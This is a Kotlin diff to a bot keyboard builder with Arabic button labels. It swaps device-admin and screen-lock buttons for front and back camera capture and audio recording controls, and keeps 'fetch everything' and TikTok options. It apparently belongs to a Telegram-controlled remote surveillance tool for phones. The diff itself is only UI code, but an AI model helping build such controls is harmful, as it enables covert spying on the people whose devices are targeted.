@@ -29,22 +29,18 @@ object KeyboardBuilder {
         })
 
         keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "🛡 تفعيل Admin"))
-            put(JSONObject().put("text", "🛡 معلومات Admin"))
+            put(JSONObject().put("text", "🤳 تصوير أمامي"))
+            put(JSONObject().put("text", "📸 تصوير خلفي"))
         })
 
         keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "🔒 قفل الشاشة"))
-            put(JSONObject().put("text", "📷 تعطيل الكاميرا"))
+            put(JSONObject().put("text", "🎤 بدء التسجيل"))
+            put(JSONObject().put("text", "⏹ إيقاف التسجيل"))
         })
 
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "🎵 تيك توك"))
             put(JSONObject().put("text", "🚀 جلب كل شي"))
-        })
-
-        keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "❌ إخفاء"))
         })
 
         return JSONObject().apply {
@@ -60,7 +56,7 @@ object KeyboardBuilder {
     fun stopJob(jobId: String): JSONObject {
         val rows = JSONArray()
         rows.put(JSONArray().apply {
-            put(JSONObject().put("text", "🛑 إيقاف العملية").put("callback_data", "stop_$jobId"))
+            put(JSONObject().put("text", "🛑 إيقاف").put("callback_data", "stop_$jobId"))
         })
         return JSONObject().apply { put("inline_keyboard", rows) }
     }
